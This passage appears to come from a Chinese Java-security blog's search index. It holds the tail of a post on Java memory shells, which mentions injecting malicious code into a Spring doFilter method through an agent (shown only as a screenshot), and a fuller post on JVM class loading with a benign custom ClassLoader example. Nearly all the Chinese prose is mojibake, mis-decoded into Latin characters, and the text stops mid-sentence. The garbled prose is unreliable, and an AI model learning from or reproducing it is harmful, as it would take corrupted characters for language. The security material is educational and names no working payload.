src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067977588-edc44af3-3c65-40c9-8754-b07f0fa6505f.png"></p><p>è¿è¡ŒInject_Agent_Springç±»ï¼Œåœ¨doFilteræ–¹æ³•ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼ŒæˆåŠŸæ‰§è¡Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067985294-d3ab1888-609b-4b3c-a4ca-05446a303b6c.png"></p><p>ä¸Šé¢ä»‹ç»åˆ°çš„javasistå‚è€ƒï¼š<a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81-Instrumentation">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81-Instrumentation</a></p><h2 id="4-springå†…å­˜é©¬"><a href="#4-springå†…å­˜é©¬" class="headerlink" title="4.springå†…å­˜é©¬"></a>4.springå†…å­˜é©¬</h2><p>å‚è€ƒï¼š<a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#42-spring-interceptor%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC</a></p><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQvQ=xIx9=C1roD&alichlgref=https://www.google.com.hk/#toc-5">https://xz.aliyun.com/t/12047?time__1311&#x3D;mqmhBKD50KAIKiqGNDQbiQvQ%3DxIx9%3DC1roD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com.hk%2F#toc-5</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaç±»åŠ è½½</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="Javaä»£ç æ‰§è¡Œæµç¨‹å›¾"><a href="#Javaä»£ç æ‰§è¡Œæµç¨‹å›¾" class="headerlink" title="Javaä»£ç æ‰§è¡Œæµç¨‹å›¾"></a>Javaä»£ç æ‰§è¡Œæµç¨‹å›¾</h2><p>å¤§å®¶é€šè¿‡è¿™ä¸ªæµç¨‹å›¾ï¼Œäº†è§£ä¸€ä¸‹æˆ‘ä»¬å†™å¥½çš„Javaä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Œå…¶ä¸­è¦ç»å†ç±»åŠ è½½å™¨è¿™ä¸ªæµç¨‹ï¼Œæˆ‘ä»¬å°±æ¥ä»”ç»†è®²è®²è¿™é‡Œé¢çš„çŸ¥è¯†ç‚¹ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513555137-37dd6ad4-9f9a-4976-8abb-67ddd906c304.png"></p><h2 id="ç±»åŠ è½½å­ç³»ç»Ÿ"><a href="#ç±»åŠ è½½å­ç³»ç»Ÿ" class="headerlink" title="ç±»åŠ è½½å­ç³»ç»Ÿ"></a>ç±»åŠ è½½å­ç³»ç»Ÿ</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513564091-30b1ed54-64d2-47fd-a23a-50869fb87c83.png"></p><h3 id="ç±»çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#ç±»çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ç±»çš„ç”Ÿå‘½å‘¨æœŸ"></a>ç±»çš„ç”Ÿå‘½å‘¨æœŸ</h3><p>ç±»çš„ç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ï¼šåŠ è½½ã€é“¾æ¥ã€åˆå§‹åŒ–ã€ä½¿ç”¨å’Œå¸è½½ï¼Œå…¶ä¸­åŠ è½½ã€é“¾æ¥ã€åˆå§‹åŒ–ï¼Œå±äºç±»åŠ è½½çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸‹é¢ä»”ç»†è®²è§£ã€‚ä½¿ç”¨æ˜¯æŒ‡æˆ‘ä»¬newå¯¹è±¡è¿›è¡Œä½¿ç”¨ï¼Œå¸è½½æŒ‡å¯¹è±¡è¢«åƒåœ¾å›æ”¶æ‰äº†ã€‚</p><h3 id="ç±»åŠ è½½çš„è¿‡ç¨‹"><a href="#ç±»åŠ è½½çš„è¿‡ç¨‹" class="headerlink" title="ç±»åŠ è½½çš„è¿‡ç¨‹"></a>ç±»åŠ è½½çš„è¿‡ç¨‹</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513591106-f2fbfed9-6aa3-4606-8ee8-3b5e183e95ce.png"></p><ul><li><strong>ç¬¬ä¸€æ­¥ï¼šLoadingåŠ è½½</strong></li></ul><p>é€šè¿‡ç±»çš„å…¨é™å®šåï¼ˆåŒ…å + ç±»åï¼‰ï¼Œè·å–åˆ°è¯¥ç±»çš„.classæ–‡ä»¶çš„äºŒè¿›åˆ¶å­—èŠ‚æµ</p><p>å°†äºŒè¿›åˆ¶å­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„ï¼Œè½¬åŒ–ä¸ºæ–¹æ³•åŒºè¿è¡Œæ—¶çš„æ•°æ®ç»“æ„</p><p>åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥å£</p><p>æ€»ç»“ï¼šåŠ è½½äºŒè¿›åˆ¶æ•°æ®åˆ°å†…å­˜ â€”&gt; æ˜ å°„æˆjvmèƒ½è¯†åˆ«çš„ç»“æ„ â€”&gt; åœ¨å†…å­˜ä¸­ç”Ÿæˆclassæ–‡ä»¶ã€‚</p><ul><li><strong>ç¬¬äºŒæ­¥ï¼šLinkingé“¾æ¥</strong></li></ul><p>é“¾æ¥æ˜¯æŒ‡å°†ä¸Šé¢åˆ›å»ºå¥½çš„classç±»åˆå¹¶è‡³Javaè™šæ‹Ÿæœºä¸­ï¼Œä½¿ä¹‹èƒ½å¤Ÿæ‰§è¡Œçš„è¿‡ç¨‹ï¼Œå¯åˆ†ä¸ºéªŒè¯ã€å‡†å¤‡ã€è§£æä¸‰ä¸ªé˜¶æ®µã€‚</p><p><strong>â‘  éªŒè¯ï¼ˆVerifyï¼‰</strong></p><p>ç¡®ä¿classæ–‡ä»¶ä¸­çš„å­—èŠ‚æµåŒ…å«çš„ä¿¡æ¯ï¼Œç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œä¿è¯è¿™ä¸ªè¢«åŠ è½½çš„classç±»çš„æ­£ç¡®æ€§ï¼Œä¸ä¼šå±å®³åˆ°è™šæ‹Ÿæœºçš„å®‰å…¨ã€‚</p><p><strong>â‘¡ å‡†å¤‡ï¼ˆPrepareï¼‰</strong></p><p>ä¸ºç±»ä¸­çš„é™æ€å­—æ®µåˆ†é…å†…å­˜ï¼Œå¹¶è®¾ç½®é»˜è®¤çš„åˆå§‹å€¼ï¼Œæ¯”å¦‚intç±»å‹åˆå§‹å€¼æ˜¯0ã€‚è¢«finalä¿®é¥°çš„staticå­—æ®µä¸ä¼šè®¾ç½®ï¼Œå› ä¸ºfinalåœ¨ç¼–è¯‘çš„æ—¶å€™å°±åˆ†é…äº†</p><p><strong>â‘¢ è§£æï¼ˆResolveï¼‰</strong></p><p>è§£æé˜¶æ®µçš„ç›®çš„ï¼Œæ˜¯å°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ï¼ˆå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨è§£ææˆä¸ºå®é™…å¼•ç”¨ï¼‰ã€‚å¦‚æœç¬¦å·å¼•ç”¨æŒ‡å‘ä¸€ä¸ªæœªè¢«åŠ è½½çš„ç±»ï¼Œæˆ–è€…æœªè¢«åŠ è½½ç±»çš„å­—æ®µæˆ–æ–¹æ³•ï¼Œé‚£ä¹ˆè§£æå°†è§¦å‘è¿™ä¸ªç±»çš„åŠ è½½ï¼ˆä½†æœªå¿…è§¦å‘è¿™ä¸ªç±»çš„é“¾æ¥ä»¥åŠåˆå§‹åŒ–ã€‚ï¼‰</p><p>äº‹å®ä¸Šï¼Œè§£æå™¨æ“ä½œå¾€å¾€ä¼šä¼´éšç€ JVM åœ¨æ‰§è¡Œå®Œåˆå§‹åŒ–ä¹‹åå†æ‰§è¡Œã€‚ ç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°æ‰€å¼•ç”¨çš„ç›®æ ‡ã€‚ç¬¦å·å¼•ç”¨çš„å­—é¢é‡å½¢å¼æ˜ç¡®å®šä¹‰åœ¨ã€ŠJava è™šæ‹Ÿæœºè§„èŒƒã€‹çš„Classæ–‡ä»¶æ ¼å¼ä¸­ã€‚ç›´æ¥å¼•ç”¨å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚</p><p>è§£æåŠ¨ä½œä¸»è¦é’ˆå¯¹ç±»ã€æ¥å£ã€å­—æ®µã€ç±»æ–¹æ³•ã€æ¥å£æ–¹æ³•ã€æ–¹æ³•ç±»å‹ç­‰ã€‚å¯¹åº”å¸¸é‡æ± ä¸­çš„ CONSTANT_Class_infoã€CONSTANT_Fieldref_infoã€CONSTANT_Methodref_infoç­‰ã€‚</p><ul><li><strong>ç¬¬ä¸‰æ­¥ï¼šinitializationåˆå§‹åŒ–</strong></li></ul><p>åˆå§‹åŒ–å°±æ˜¯æ‰§è¡Œç±»çš„æ„é€ å™¨æ–¹æ³•init()çš„è¿‡ç¨‹ã€‚</p><p>è¿™ä¸ªæ–¹æ³•ä¸éœ€è¦å®šä¹‰ï¼Œæ˜¯javacç¼–è¯‘å™¨è‡ªåŠ¨æ”¶é›†ç±»ä¸­æ‰€æœ‰ç±»å˜é‡çš„èµ‹å€¼åŠ¨ä½œå’Œé™æ€ä»£ç å—ä¸­çš„è¯­å¥åˆå¹¶æ¥çš„ã€‚</p><p>è‹¥è¯¥ç±»å…·æœ‰çˆ¶ç±»ï¼Œjvmä¼šä¿è¯çˆ¶ç±»çš„initå…ˆæ‰§è¡Œï¼Œç„¶ååœ¨æ‰§è¡Œå­ç±»çš„initã€‚</p><h3 id="ç±»åŠ è½½å™¨çš„åˆ†ç±»"><a href="#ç±»åŠ è½½å™¨çš„åˆ†ç±»" class="headerlink" title="ç±»åŠ è½½å™¨çš„åˆ†ç±»"></a>ç±»åŠ è½½å™¨çš„åˆ†ç±»</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513604616-34957f07-891f-4f50-94b4-d210759faa12.png"></p><ul><li><strong>ç¬¬ä¸€ä¸ªï¼šå¯åŠ¨ç±»&#x2F;å¼•å¯¼ç±»ï¼šBootstrap ClassLoader</strong></li></ul><p>è¿™ä¸ªç±»åŠ è½½å™¨ä½¿ç”¨C&#x2F;C++è¯­è¨€å®ç°çš„ï¼ŒåµŒå¥—åœ¨JVMå†…éƒ¨ï¼Œjavaç¨‹åºæ— æ³•ç›´æ¥æ“ä½œè¿™ä¸ªç±»ã€‚</p><p>å®ƒç”¨æ¥åŠ è½½Javaæ ¸å¿ƒç±»åº“ï¼Œå¦‚ï¼šJAVA_HOME&#x2F;jre&#x2F;lib&#x2F;rt.jarã€resources.jarã€sun.boot.class.pathè·¯å¾„ä¸‹çš„åŒ…ï¼Œç”¨äºæä¾›jvmè¿è¡Œæ‰€éœ€çš„åŒ…ã€‚</p><p>å¹¶ä¸æ˜¯ç»§æ‰¿è‡ªjava.lang.ClassLoaderï¼Œå®ƒæ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨</p><p>å®ƒåŠ è½½æ‰©å±•ç±»åŠ è½½å™¨å’Œåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼Œå¹¶æˆä¸ºä»–ä»¬çš„çˆ¶ç±»åŠ è½½å™¨</p><p>å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå¯åŠ¨ç±»åªåŠ è½½åŒ…åä¸ºï¼šjavaã€javaxã€sunå¼€å¤´çš„ç±»</p><ul><li><strong>ç¬¬äºŒä¸ªï¼šæ‰©å±•ç±»åŠ è½½å™¨ï¼šExtension ClassLoader</strong></li></ul><p>Javaè¯­è¨€ç¼–å†™ï¼Œç”±sun.misc.Launcher$ExtClassLoaderå®ç°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Javaç¨‹åºæ“ä½œè¿™ä¸ªåŠ è½½å™¨</p><p>æ´¾ç”Ÿç»§æ‰¿è‡ªjava.lang.ClassLoaderï¼Œçˆ¶ç±»åŠ è½½å™¨ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨</p><p>ä»ç³»ç»Ÿå±æ€§ï¼šjava.ext.dirsç›®å½•ä¸­åŠ è½½ç±»åº“ï¼Œæˆ–è€…ä»JDKå®‰è£…ç›®å½•ï¼šjre&#x2F;lib&#x2F;extç›®å½•ä¸‹åŠ è½½ç±»åº“ã€‚æˆ‘ä»¬å°±å¯ä»¥å°†æˆ‘ä»¬è‡ªå·±çš„åŒ…æ”¾åœ¨ä»¥ä¸Šç›®å½•ä¸‹ï¼Œå°±ä¼šè‡ªåŠ¨åŠ è½½è¿›æ¥äº†ã€‚</p><ul><li><strong>ç¬¬ä¸‰ä¸ªï¼šåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼šApplication Classloader</strong></li></ul><p>Javaè¯­è¨€ç¼–å†™ï¼Œç”±sun.misc.Launcher$AppClassLoaderå®ç°ã€‚</p><p>æ´¾ç”Ÿç»§æ‰¿è‡ªjava.lang.ClassLoaderï¼Œçˆ¶ç±»åŠ è½½å™¨ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨</p><p>å®ƒè´Ÿè´£åŠ è½½ç¯å¢ƒå˜é‡classpathæˆ–è€…ç³»ç»Ÿå±æ€§java.class.pathæŒ‡å®šè·¯å¾„ä¸‹çš„ç±»åº“</p><p>å®ƒæ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œæˆ‘ä»¬Javaç¨‹åºä¸­çš„ç±»ï¼Œéƒ½æ˜¯ç”±å®ƒåŠ è½½å®Œæˆçš„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ClassLoader#getSystemClassLoader()è·å–å¹¶æ“ä½œè¿™ä¸ªåŠ è½½å™¨</p><ul><li><strong>ç¬¬å››ä¸ªï¼šè‡ªå®šä¹‰åŠ è½½å™¨</strong></li></ul><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä»¥ä¸Š3ç§åŠ è½½å™¨èƒ½æ»¡è¶³æˆ‘ä»¬æ—¥å¸¸çš„å¼€å‘å·¥ä½œï¼Œä¸æ»¡è¶³æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è‡ªå®šä¹‰åŠ è½½å™¨</p><p>æ¯”å¦‚ç”¨ç½‘ç»œåŠ è½½Javaç±»ï¼Œä¸ºäº†ä¿è¯ä¼ è¾“ä¸­çš„å®‰å…¨æ€§ï¼Œé‡‡ç”¨äº†åŠ å¯†æ“ä½œï¼Œé‚£ä¹ˆä»¥ä¸Š3ç§åŠ è½½å™¨å°±æ— æ³•åŠ è½½è¿™ä¸ªç±»ï¼Œè¿™æ—¶å€™å°±éœ€è¦è‡ªå®šä¹‰åŠ è½½å™¨</p><p><strong>è‡ªå®šä¹‰åŠ è½½å™¨å®ç°æ­¥éª¤</strong></p><p>ç»§æ‰¿java.lang.ClassLoaderç±»ï¼Œé‡å†™findClass()æ–¹æ³•</p><p>å¦‚æœæ²¡æœ‰å¤ªå¤æ‚çš„éœ€æ±‚ï¼Œå¯ä»¥ç›´æ¥ç»§æ‰¿URLClassLoaderç±»ï¼Œé‡å†™loadClassæ–¹æ³•ï¼Œå…·ä½“å¯å‚è€ƒAppClassLoaderå’ŒExtClassLoaderã€‚</p><p>ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz.javajichu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String pathToClass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String pathToClass)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pathToClass = pathToClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = loadClassFromFile(name);</span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Cannot load class &quot;</span> + name, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] loadClassFromFile(String fileName) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(pathToClass + fileName + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] buffer;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">nextValue</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ((nextValue = inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteStream.write(nextValue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        buffer = byteStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰ä¸€ä¸ªç±»å¹¶ç¼–è¯‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pers</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayhello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;gggggg&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz.javajichu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>(<span class="string">&quot;D:\\spring_study\\spel_spring\\src\\main\\java\\&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; person = myClassLoader.findClass(<span class="string">&quot;pers&quot;</span>);</span><br><span class="line">        System.out.println(person.getClassLoader());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> person.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">sayhello</span> <span class="operator">=</span> person.getDeclaredMethod(<span class="string">&quot;sayhello&quot;</span>);</span><br><span class="line">        sayhello.invoke(o);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">com.zbz.javajichu.MyClassLoader@3feba861</span><br><span class="line">gggggg</span><br></pre></td></tr></table></figure><p><strong>è·å–ClassLoaderå‡ ç§æ–¹å¼</strong></p><p>å®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå…¶åæ‰€æœ‰çš„ç±»åŠ è½½å™¨ç»§æ‰¿è‡ª ClassLoaderï¼ˆä¸åŒ…æ‹¬å¯åŠ¨ç±»åŠ è½½å™¨ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹å¼ä¸€ï¼šè·å–å½“å‰ç±»çš„ ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// æ–¹å¼äºŒï¼šè·å–å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡çš„ ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// æ–¹å¼ä¸‰ï¼šè·å–ç³»ç»Ÿçš„ ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// æ–¹å¼å››ï¼šè·å–è°ƒç”¨è€…çš„ ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h3 id="ç±»åŠ è½½æœºåˆ¶â€”åŒäº²å§”æ´¾æœºåˆ¶"><a href="#ç±»åŠ è½½æœºåˆ¶â€”åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="ç±»åŠ è½½æœºåˆ¶â€”åŒäº²å§”æ´¾æœºåˆ¶"></a>ç±»åŠ è½½æœºåˆ¶â€”åŒäº²å§”æ´¾æœºåˆ¶</h3><p>jvmå¯¹classæ–‡ä»¶é‡‡ç”¨çš„æ˜¯æŒ‰éœ€åŠ è½½çš„æ–¹å¼ï¼Œå½“éœ€è¦ä½¿ç”¨è¯¥ç±»æ—¶ï¼Œjvmæ‰ä¼šå°†å®ƒçš„classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­äº§ç”Ÿclasså¯¹è±¡ã€‚</p><p>åœ¨åŠ è½½ç±»çš„æ—¶å€™ï¼Œæ˜¯é‡‡ç”¨çš„åŒäº²å§”æ´¾æœºåˆ¶ï¼Œå³æŠŠè¯·æ±‚äº¤ç»™çˆ¶ç±»å¤„ç†çš„ä¸€ç§ä»»åŠ¡å§”æ´¾æ¨¡å¼ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713513634255-a91963be-ae07-4350-8c32-c27dbb3f3b76.png"></p><ul><li><strong>å·¥ä½œåŸç†</strong></li></ul><p>ï¼ˆ1ï¼‰å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ¥æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒè‡ªå·±ä¸ä¼šå…ˆå»åŠ è½½ï¼Œä¼šæŠŠè¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨å»æ‰§è¡Œã€‚</p><p>ï¼ˆ2ï¼‰å¦‚æœçˆ¶ç±»è¿˜å­˜åœ¨çˆ¶ç±»åŠ è½½å™¨ï¼Œåˆ™ç»§ç»­å‘ä¸Šå§”æ‰˜ï¼Œä¸€ç›´å§”æ‰˜åˆ°å¯åŠ¨ç±»åŠ è½½å™¨ï¼šBootstrap ClassLoader</p><p>ï¼ˆ3ï¼‰å¦‚æœçˆ¶ç±»åŠ è½½å™¨å¯ä»¥å®ŒæˆåŠ è½½ä»»åŠ¡ï¼Œå°±è¿”å›æˆåŠŸç»“æœï¼Œå¦‚æœçˆ¶ç±»åŠ è½½å¤±è´¥ï¼Œå°±ç”±å­ç±»è‡ªå·±å»å°è¯•åŠ è½½ï¼Œå¦‚æœå­ç±»åŠ è½½å¤±è´¥å°±ä¼šæŠ›å‡ºClassNotFoundExceptionå¼‚å¸¸ï¼Œè¿™å°±æ˜¯åŒäº²å§”æ´¾æ¨¡å¼</p><ul><li><strong>ç¬¬ä¸‰æ–¹åŒ…åŠ è½½æ–¹å¼ï¼šåå‘å§”æ´¾æœºåˆ¶</strong></li></ul><p>åœ¨Javaåº”ç”¨ä¸­å­˜åœ¨ç€å¾ˆå¤šæœåŠ¡æä¾›è€…æ¥å£ï¼ˆService Provider Interfaceï¼ŒSPIï¼‰ï¼Œè¿™äº›æ¥å£å…è®¸ç¬¬ä¸‰æ–¹ä¸ºå®ƒä»¬æä¾›å®ç°ï¼Œå¦‚å¸¸è§çš„ SPI æœ‰ JDBCã€JNDIç­‰ï¼Œè¿™äº› SPI çš„æ¥å£å±äº Java æ ¸å¿ƒåº“ï¼Œä¸€èˆ¬å­˜åœ¨rt.jaråŒ…ä¸­ï¼Œç”±Bootstrapç±»åŠ è½½å™¨åŠ è½½ã€‚è€ŒBootstrapç±»åŠ è½½å™¨æ— æ³•ç›´æ¥åŠ è½½SPIçš„å®ç°ç±»ï¼ŒåŒæ—¶ç”±äºåŒäº²å§”æ´¾æ¨¡å¼çš„å­˜åœ¨ï¼ŒBootstrapç±»åŠ è½½å™¨ä¹Ÿæ— æ³•åå‘å§”æ‰˜AppClassLoaderåŠ è½½å™¨SPIçš„å®ç°ç±»ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ç§ç‰¹æ®Šçš„ç±»åŠ è½½å™¨æ¥åŠ è½½ç¬¬ä¸‰æ–¹çš„ç±»åº“ï¼Œè€Œçº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆåŒäº²å§”æ´¾æ¨¡å‹çš„ç 